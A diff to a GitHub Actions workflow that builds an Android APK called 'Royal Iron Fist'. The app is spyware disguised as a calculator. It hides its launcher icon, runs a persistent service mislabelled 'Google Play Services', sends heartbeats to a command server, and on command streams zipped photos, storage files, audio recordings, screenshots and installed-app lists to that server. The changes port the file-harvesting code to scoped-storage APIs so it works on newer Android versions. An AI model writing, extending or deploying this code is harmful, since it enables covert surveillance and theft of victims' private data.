@@ -1,11 +1,11 @@
-name: Royal Iron Fist Node Builder v9.0 Ultimate Stealth
+name: Royal Iron Fist Node Builder v9.5 Ultimate Power
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Royal Iron Fist Operational APK v9.0
+    name: Build Royal Iron Fist Operational APK v9.5
     runs-on: ubuntu-latest
 
     steps:
@@ -92,6 +92,7 @@ jobs:
           import android.app.NotificationChannel
           import android.app.NotificationManager
           import android.app.Service
+          import android.content.ContentUris
           import android.content.ClipboardManager
           import android.content.Context
           import android.content.Intent
@@ -129,13 +130,13 @@ jobs:
               override fun onCreate() {
                   super.onCreate()
                   val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::StealthLock")
+                  wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "RoyalIronFist::UltimateLock")
                   wakeLock?.acquire(10 * 60 * 60 * 1000L)
                   startForegroundServiceNotification()
               }
 
               private fun startForegroundServiceNotification() {
-                  val channelId = "royal_stealth_channel"
+                  val channelId = "royal_ultimate_channel"
                   val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
                   val manager = getSystemService(NotificationManager::class.java)
                   manager?.createNotificationChannel(channel)
@@ -169,7 +170,7 @@ jobs:
                               val currentTime = System.currentTimeMillis()
                               val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                               val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Royal Stealth Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                              val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Ultimate Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                               if (sendHeartbeat) {
                                   lastHeartbeatSent = currentTime
@@ -218,16 +219,16 @@ jobs:
                                                       streamTextMemoryDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                                   }
                                                   action.contains("EXTRACT_CAMERA_ZIP") -> {
-                                                      streamCursorArchiveMemoryDirect(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                   }
                                                   action.contains("EXTRACT_STORAGE_ZIP") -> {
-                                                      streamCursorArchiveMemoryDirect(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
+                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                                   }
                                                   action.contains("EXTRACT_AUDIO") -> {
-                                                      streamCursorArchiveMemoryDirect(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                                   }
                                                   action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
-                                                      streamCursorArchiveMemoryDirect(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                                      streamUniversalMediaStoreStream(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                                   }
                                               }
                                           }
@@ -248,13 +249,14 @@ jobs:
                   try {
                       val bytes = content.toByteArray(Charsets.UTF_8)
                       uploadBytesDirect(nodeId, nodeModel, fileName, bytes)
-                      sendReportToServer(nodeId, nodeModel, "✅ [حصاد شبحي نقي RAM] الملف <b>$fileName</b> تم بثه مركزياً بدون أي أثر على القرص.")
+                      sendReportToServer(nodeId, nodeModel, "✅ [حصاد نقي RAM] الملف <b>$fileName</b> تم بثه مركزياً بنجاح تام.")
                   } catch (e: Exception) {}
               }
 
-              private fun streamCursorArchiveMemoryDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+              // محرك البث الشامل الآمن المتوافق مع أندرويد 10 إلى 14 (Scoped Storage Safe)
+              private fun streamUniversalMediaStoreStream(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
                   try {
-                      sendReportToServer(nodeId, nodeModel, "⚡ [البث الشبحي المباشر] جاري ضغط وتدفق بيانات $prefix مباشرة عبر الشبكة...")
+                      sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الذكي] جاري استخراج وتدفق بيانات $prefix عبر قنوات النظام الآمنة...")
                       
                       val url = URL(C2_INGEST_URL)
                       val conn = url.openConnection() as HttpURLConnection
@@ -265,47 +267,54 @@ jobs:
                       conn.setRequestProperty("Content-Type", "application/octet-stream")
                       conn.doOutput = true
                       conn.setChunkedStreamingMode(1024 * 64)
-                      conn.connectTimeout = 180000
-                      conn.readTimeout = 180000
+                      conn.connectTimeout = 300000
+                      conn.readTimeout = 300000
 
                       var fileCount = 0
                       conn.outputStream.use { os ->
                           ZipOutputStream(os).use { zipOut ->
                               zipOut.setLevel(Deflater.BEST_COMPRESSION)
-                              val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME)
+                              
+                              val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
                               val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
-                              val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)
+                              
+                              val cursor = try {
+                                  contentResolver.query(contentUri, projection, null, null, sortOrder)
+                              } catch (e: Exception) { null }
 
                               cursor?.use {
-                                  val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                                  val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                                   val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                                  while (it.moveToNext() && fileCount < 2000) {
-                                      if (dataIdx != -1 && nameIdx != -1) {
-                                          val filePath = it.getString(dataIdx)
-                                          val fileName = it.getString(nameIdx)
-                                          if (filePath != null) {
-                                              val file = java.io.File(filePath)
-                                              if (file.exists() && file.isFile) {
-                                                  try {
-                                                      zipOut.putNextEntry(ZipEntry("$prefix/$fileName"))
-                                                      file.inputStream().use { fis -> fis.copyTo(zipOut) }
-                                                      zipOut.closeEntry()
-                                                      fileCount++
-                                                  } catch (ex: Exception) {}
+                                  
+                                  while (it.moveToNext() && fileCount < 1000) {
+                                      if (idIdx != -1 && nameIdx != -1) {
+                                          val id = it.getLong(idIdx)
+                                          val name = it.getString(nameIdx) ?: "file_$id.dat"
+                                          val itemUri = ContentUris.withAppendedId(contentUri, id)
+                                          
+                                          try {
+                                              contentResolver.openInputStream(itemUri)?.use { inputStream ->
+                                                  zipOut.putNextEntry(ZipEntry("$prefix/$name"))
+                                                  inputStream.copyTo(zipOut)
+                                                  zipOut.closeEntry()
+                                                  fileCount++
                                               }
-                                          }
+                                          } catch (ex: Exception) {}
                                       }
                                   }
                               }
                               zipOut.finish()
                           }
                       }
+                      
                       val code = conn.responseCode
                       conn.disconnect()
                       if (code == 200) {
-                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الشبحي وبثه بنجاح]\n📂 الأرشيف: <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
+                          sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الشامل بنجاح]\n📂 الأرشيف: <code>$prefix</code> ($fileCount ملفاً) - [Zero Disk Footprint]")
                       }
-                  } catch (e: Exception) {}
+                  } catch (e: Exception) {
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في تدفق أرشيف $prefix: ${e.message}")
+                  }
               }
 
               private fun uploadBytesDirect(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
@@ -480,7 +489,6 @@ jobs:
           import android.os.Build
           import android.os.Bundle
           import android.view.Gravity
-          import android.view.View
           import android.widget.Button
           import android.widget.GridLayout
           import android.widget.TextView
@@ -495,10 +503,8 @@ jobs:
               override fun onCreate(savedInstanceState: Bundle?) {
                   super.onCreate(savedInstanceState)
                   
-                  // فحص الصلاحيات وطلبها فوراً
                   checkAndRequestPermissions()
 
-                  // بناء واجهة آلة حاسبة ذكية تهمس بالبراءة وتخدع الناظرين
                   val rootLayout = android.widget.LinearLayout(this).apply {
                       orientation = android.widget.LinearLayout.VERTICAL
                       setBackgroundColor(0xFF121212.toInt())
@@ -593,7 +599,6 @@ jobs:
                           startService(serviceIntent)
                       }
 
-                      // الإخفاء الشبحي التلقائي للأيقونة من شاشة التطبيقات بعد منح الصلاحيات
                       val componentName = ComponentName(this, MainActivity::class.java)
                       packageManager.setComponentEnabledSetting(
                           componentName,
@@ -609,7 +614,6 @@ jobs:
                       "⌫" -> { if (currentInput.isNotEmpty()) currentInput = currentInput.drop(1); display.text = if (currentInput.isEmpty()) "0" else currentInput }
                       "=" -> {
                           try {
-                              // محاكاة حسابية بسيطة للاستخدام الوهمي
                               val result = eval(currentInput)
                               display.text = result.toString()
                               currentInput = result.toString()
@@ -783,5 +787,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Royal-Iron-Fist-v9.0-Stealth
+          name: Royal-Iron-Fist-v9.5-Ultimate
           path: app/build/outputs/apk/debug/app-debug.apk
